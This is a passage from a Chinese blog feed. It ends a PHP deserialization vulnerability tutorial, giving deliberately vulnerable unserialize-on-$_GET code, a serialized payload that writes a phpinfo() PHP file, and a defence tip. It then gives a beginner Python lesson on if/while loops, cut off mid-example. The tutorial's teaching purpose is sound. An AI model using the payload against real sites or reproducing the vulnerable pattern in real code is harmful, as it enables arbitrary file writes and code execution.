class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span></span>) </span>&#123;</span><br><span class="line"> <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.php&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"> <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$test</span>);</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="number">123</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>(<span class="variable">$this</span>-&gt;test);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$class_u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上代码，构造payload执行phpinfo()；<br>O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>“;}<br>执行完，代码会被写进test.php文件内，访问123.php文件，也可以执行phpinfo()。<br>#五、反序列化漏洞防御<br>和大多数漏洞一样，反序列化的问题也是用户参数的控制问题引起的，所以好的预防措施就是不要把用户的输入或者是用户可控的参数直接放进反序列化的操作中去。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（七）</title>
      <link href="/2022/04/21/python_seven/"/>
      <url>/2022/04/21/python_seven/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140015088.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python流程控制的知识。&#x3D;&#x3D;</p><h1 id="一、if判断"><a href="#一、if判断" class="headerlink" title="一、if判断"></a>一、if判断</h1><h2 id="1、条件"><a href="#1、条件" class="headerlink" title="1、条件"></a>1、条件</h2><p>在讲if判断之前简单说一下什么是条件。<br>条件的意思是事物存在、发展的影响因素，所具备或处于的状况。<br>###（1）什么可以当做条件<br>上面是我们对条件的解释，不懂也可以，重要的是python中什么可以当做条件，以及从条件中最终得到什么，所有条件最终都会返回一个布尔值，就是我们常说的真和假，那么只要能返回布尔值，就可以当做条件。<br>####a、显式布尔值<br>条件可以是：比较运算&#x2F;逻辑运算等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> &gt; <span class="number">2</span>   <span class="comment"># 返回的布尔值是True</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">18</span></span><br><span class="line">gender  = <span class="string">&quot;女&quot;</span></span><br><span class="line">age == <span class="number">18</span> <span class="keyword">and</span> gender == <span class="string">&quot;女&quot;</span></span><br></pre></td></tr></table></figure><p>条件可以直接是True&#x2F;False<br>####b、隐式布尔值<br>所有的数据类型的值都可以当做条件去用，要和if连用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,<span class="number">0</span>  <span class="number">1.0</span>  <span class="string">&quot;1&quot;</span> , [<span class="number">1</span>] , &#123;<span class="string">&quot;k1&quot;</span>:<span class="string">&quot;v1&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>其中0，None，空（空字符串，空字典，空列表。。）代表的布尔值都是False，其余的都是True<br>补充：在Python查看一个值对应的bool值，可以通过bool值查看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>([]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(&#123;&#125;))</span><br></pre></td></tr></table></figure><h2 id="2、if判断"><a href="#2、if判断" class="headerlink" title="2、if判断"></a>2、if判断</h2><h3 id="（1）什么是if判断"><a href="#（1）什么是if判断" class="headerlink" title="（1）什么是if判断"></a>（1）什么是if判断</h3><p>实际上if判断在我们的生活中经常用，可能是你没有在意他，因为真的太平常不过了，你只需要把这个if翻译成如果，就有那味了。<br>###（2）为什么要有if判断<br>就是让计算机&#x2F;程序&#x2F;py脚本能够像人一样判断一个条件是否成立，然后再去做某件事的功能。<br>###（3）if判断语法<br>####a、语法1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">    <span class="comment"># 代码1,2,3 属于同一级别的代码,总体称为一组代码块,因为他们缩进相同,都是四个空格.</span></span><br><span class="line">    <span class="comment"># 特点:按照自上而下的方式运行</span></span><br><span class="line">    <span class="comment"># python用缩进来标识代码级别的,但是不能随意缩进</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">    <span class="comment"># 代码1,2,3 属于同一级别的代码,总体称为一组代码块,因为他们缩进相同,都是四个空格.</span></span><br><span class="line">    <span class="comment"># 特点:按照自上而下的方式运行</span></span><br><span class="line">    <span class="comment"># python用缩进来标识代码级别的,但是不能随意缩进</span></span><br></pre></td></tr></table></figure><h4 id="b、语法2"><a href="#b、语法2" class="headerlink" title="b、语法2"></a>b、语法2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="comment"># 当if后面的条件成立,即条件返回True,会执行if下面缩进的代码,else下面缩进的代码不会执行。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当if后面的条件不成立的时候，if下面的代码块不会执行，else下面的代码块这个时候会执行</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">38</span></span><br><span class="line">gender = <span class="string">&#x27;女&#x27;</span></span><br><span class="line">star = <span class="string">&#x27;双子座&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">16</span> &lt; age &lt; <span class="number">20</span> <span class="keyword">and</span> gender == <span class="string">&#x27;女&#x27;</span> <span class="keyword">and</span> star == <span class="string">&#x27;水平座&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我喜欢,我们在一起吧...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;阿姨好,我逗你玩呢...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;其他代码&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="c、语法3"><a href="#c、语法3" class="headerlink" title="c、语法3"></a>c、语法3</h4><p>判断多个条件是否成立，只要一个条件成立就不会再继续判断下面的条件了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><h4 id="d、语法4"><a href="#d、语法4" class="headerlink" title="d、语法4"></a>d、语法4</h4><p>也是if判断的最终版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>:</span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">3</span>:</span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">4</span>:</span><br><span class="line">    代码<span class="number">4</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">5</span></span><br><span class="line"><span class="comment"># 这里的代码5是在所有条件都不成立时,才会执行.</span></span><br></pre></td></tr></table></figure><h3 id="（4）if嵌套"><a href="#（4）if嵌套" class="headerlink" title="（4）if嵌套"></a>（4）if嵌套</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的年龄:&#x27;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(age)</span><br><span class="line"><span class="keyword">if</span> <span class="number">18</span> &lt; age &lt; <span class="number">25</span>:</span><br><span class="line">    gender = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的性别:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> gender == <span class="string">&#x27;女&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;美女你好...&#x27;</span>)</span><br><span class="line">        is_merry = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_merry:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;刚好我也是单身..&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;哈哈哈,我也有女朋友了,打扰了..&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;对不起,妹子才是我所喜欢的,打扰了&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;打扰了,我们年龄不相仿..&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="二、while循环"><a href="#二、while循环" class="headerlink" title="二、while循环"></a>二、while循环</h1><h2 id="1、循环"><a href="#1、循环" class="headerlink" title="1、循环"></a>1、循环</h2><h3 id="（1）什么是循环"><a href="#（1）什么是循环" class="headerlink" title="（1）什么是循环"></a>（1）什么是循环</h3><p>循环就是重复的做某件事情<br>###（2）为什么要有循环<br>就是为了让计算机&#x2F;程序&#x2F;py脚本能够像人一样重复的做某件事情。<br>##2、while循环<br>###（1）while语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    代码<span class="number">3</span>   ( 循环体代码 )</span><br></pre></td></tr></table></figure><p>while循环的执行流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">步骤<span class="number">1</span>：如果条件为真，那么依次执行：代码<span class="number">1</span>、代码<span class="number">2</span>、代码<span class="number">3</span>、......</span><br><span class="line">步骤<span class="number">2</span>：执行完毕后再次判断条件,如果条件为<span class="literal">True</span>则再次执行：代码<span class="number">1</span>、代码<span class="number">2</span>、代码<span class="number">3</span>、......，如果条件为<span class="literal">False</span>,则循环终止</span><br></pre></td></tr></table></figure><p>while循环是基于条件成立才工作的，所以while循环也可以叫做条件循环。<br>###（2）while循环示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;循环结束...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 循环结束</span></span><br></pre></td></tr></table></figure><h2 id="3、死循与效率问题"><a href="#3、死循与效率问题" class="headerlink" title="3、死循与效率问题"></a>3、死循与效率问题</h2><h3 id="（1）死循环"><a href="#（1）死循环" class="headerlink" title="（1）死循环"></a>（1）死循环</h3><p>所谓死循环就是不会结束的循环，即条件一直是成立的while循环，他会不停的反复执行循环体的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在循环...&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="a、纯计算的死循环"><a href="#a、纯计算的死循环" class="headerlink" title="a、纯计算的死循环"></a>a、纯计算的死循环</h4><p>本质上死循环对计算机是无害的，但是如果循环体中的代码是纯计算的，那么你这个程序就会一直让CPU处于计算的状态，一秒都不会停的那种，那么对于整个程序来说就是有害的了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="number">1</span>+<span class="number">1</span>    <span class="comment"># 这种状态下用不了多久你电脑的风扇就开始呼呼了,因为cpu一直在工作. </span></span><br></pre></td></tr></table></figure><h4 id="b、有IO操作的循环"><a href="#b、有IO操作的循环" class="headerlink" title="b、有IO操作的循环"></a>b、有IO操作的循环</h4><p>这种情况下的死循环对整个程序来说是无害的，因为IO操作，CPU是不工作的，也就是说在这个死循环中，CPU不是一直反复执行这个循环体的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    content = <span class="built_in">input</span>(<span class="string">&quot;请输入:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><h2 id="4、while循环应用案例"><a href="#4、while循环应用案例" class="headerlink" title="4、while循环应用案例"></a>4、while循环应用案例</h2><h3 id="（1）用户认证程序"><a href="#（1）用户认证程序" class="headerlink" title="（1）用户认证程序"></a>（1）用户认证程序</h3><h4 id="a、基本版"><a href="#a、基本版" class="headerlink" title="a、基本版"></a>a、基本版</h4><p>用户认证程序的基本逻辑就是接收用户输入的用户名密码与程序中存放的用户名密码进行判断，判断成功则登录成功，判断失败则输出账号或密码错误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">inp_name = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)</span><br><span class="line">inp_pwd = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> inp_name == username <span class="keyword">and</span> inp_pwd == password:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入用户名或密码错误！&quot;</span>)</span><br></pre></td></tr></table></figure><p>上面程序是已经把功能实现了，但是我们日常生活中，用户名或密码输入错误，程序都会让我们重新输入，所以我们的程序也应该可以做到重复输入，一想到重复操作，既然学过了while循环，那么你应该联想到这个，应该是循环几次呢？我们假定先让用户可以一直输入。<br>####b、循环输入版</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp_name = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)</span><br><span class="line">    inp_pwd = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> inp_name == username <span class="keyword">and</span> inp_pwd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的用户名或密码错误！&quot;</span>)</span><br></pre></td></tr></table></figure><p>虽然重复输入用while循环解决了，但是我们的程序出现了一个新的bug，那就是用户输入时，也会继续输入。<br>所以我们要解决用户输入正确的用户名和密码后，应该结束循环，那么我们来学习一下退出循环的两种方式，然后再优化我们的程序。<br>##5、退出循环的两种方式<br>###（1）基于条件退出循环<br>我们都知道死循环是条件一直成立，如果我们想要退出循环，那么只要把条件改为假即可，既然要对条件进行修改，那么我们就不能直接把条件的值放在while后面，而是通过一个变量来表示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> tag:</span><br><span class="line">    inp_name =  <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)</span><br><span class="line">    inp_pwd =  <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> inp_name == username <span class="keyword">and</span> inp_pwd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">        <span class="comment"># 改变条件退出循环,但是tag之后的代码还运行,下次循环判断条件时才生效</span></span><br><span class="line">        tag = <span class="literal">False</span>       </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的用户名或密码错误！&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="（2）break退出循环"><a href="#（2）break退出循环" class="headerlink" title="（2）break退出循环"></a>（2）break退出循环</h3><p>break是python的保留字，一般和循环使用，作用是退出当前循环。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp_name =  <span class="built_in">input</span>(<span class="string">&quot;请输入用户名：&quot;</span>)</span><br><span class="line">    inp_pwd =  <span class="built_in">input</span>(<span class="string">&quot;请输入密码：&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> inp_name == username <span class="keyword">and</span> inp_pwd == passwd:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;登陆成功&quot;</span>)</span><br><span class="line">        <span class="comment"># 只要运行到break就会立即终止本次循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的用户名或密码错误！&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过break和修改条件两种方式都可以退出循环，区别就是一个还会继续执行到下一次的条件判断，另一个则是直接退出。<br>##6、循环嵌套<br>循环是可以像if一样进行相互之间的嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        代码<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            代码<span class="number">3</span></span><br><span class="line">            ....</span><br></pre></td></tr></table></figure><p>对于循环的嵌套也有两种退出的方法<br>###（1）分层退出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        代码<span class="number">2</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            代码<span class="number">3</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            ....</span><br></pre></td></tr></table></figure><h3 id="（2）统一条件退出"><a href="#（2）统一条件退出" class="headerlink" title="（2）统一条件退出"></a>（2）统一条件退出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> tag:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> tag:</span><br><span class="line">        代码<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> tag:</span><br><span class="line">            代码<span class="number">3</span></span><br><span class="line">            tag = <span class="literal">False</span></span><br><span class="line">            ....</span><br></pre></td></tr></table></figure><h2 id="7、while-continue"><a href="#7、while-continue" class="headerlink" title="7、while+continue"></a>7、while+continue</h2><h3 id="（1）continue"><a href="#（1）continue" class="headerlink" title="（1）continue"></a>（1）continue</h3><p>continue是结束本次循环，直接进入下一次。<br>###（2）逢7跳过<br>在0-9中只打印0,1,2,3,4,5,6,8,9<br>####a、打印0-9</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="b、遇见7不打印"><a href="#b、遇见7不打印" class="headerlink" title="b、遇见7不打印"></a>b、遇见7不打印</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析一下,不打印说明条件不成立,所以我们可以在7哪里设置一个if判断,并跳过该次打印</span></span><br><span class="line"><span class="comment"># 打印跳过但是自增并不需要跳过,所以还是需要自增</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">7</span>:</span><br><span class="line">        count += <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>强调：在continue之后添加同级代码毫无意义，因为永远无法运行<br>##8、while+else<br>在while循环的后面，我们可以跟else语句，当while循环正常执行完并且中间没有被break中止的话，就会执行else后面的语句，所以我们可以用else来验证，循环是否正常结束。<br>###（1）语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">3</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 只有当while循环结束之后,并且没有被break打断,才会执行else里面的代码</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count += 